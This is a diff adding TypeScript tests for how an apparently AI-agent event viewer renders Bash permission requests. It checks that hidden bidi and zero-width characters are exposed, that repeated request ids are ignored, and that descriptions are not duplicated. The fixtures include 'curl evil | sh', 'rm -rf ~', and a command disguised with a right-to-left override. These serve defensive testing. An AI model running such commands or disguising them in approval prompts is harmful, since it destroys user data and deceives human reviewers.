@@ -188,3 +188,50 @@ describe("event order and endings", () => {
     expect(html).toContain("run: curl evil | sh");
   });
 });
+
+describe("what a permission request shows", () => {
+  const request = (seq: number, input: Record<string, unknown>, request_id = "r") =>
+    envelope(seq, {
+      type: "permission.requested",
+      request_id,
+      tool_use_id: "t",
+      tool_name: "Bash",
+      input,
+      suggestions: [],
+      flags: { default_to_no: false, suppress_always_allow: false, requires_user_interaction: false, classifier_approvable: false },
+    });
+
+  it("marks characters that would hide or reorder text, as their code points", () => {
+    const html = render(play([request(0, { command: "echo safe ‮; rm -rf ~ #​⁦" })]));
+    expect(html).toContain("U+202E");
+    expect(html).toContain("U+200B");
+    expect(html).toContain("U+2066");
+    expect(html).not.toContain("‮");
+    expect(html).not.toContain("​");
+  });
+
+  it("is the first request with an id: a repeat changes nothing", () => {
+    const first = play([request(0, { command: "ls" })]);
+    const repeated = play([request(1, { command: "rm -rf ~" })], first);
+    expect(repeated.items).toEqual(first.items);
+    expect(render(repeated)).not.toContain("rm -rf");
+  });
+
+  it("shows a description once, not again as a field", () => {
+    const html = render(
+      play([
+        envelope(0, {
+          type: "permission.requested",
+          request_id: "r",
+          tool_use_id: "t",
+          tool_name: "Bash",
+          description: "List files",
+          input: { command: "ls", description: "List files" },
+          suggestions: [],
+          flags: { default_to_no: false, suppress_always_allow: false, requires_user_interaction: false, classifier_approvable: false },
+        }),
+      ]),
+    );
+    expect(html.split("List files")).toHaveLength(2);
+  });
+});
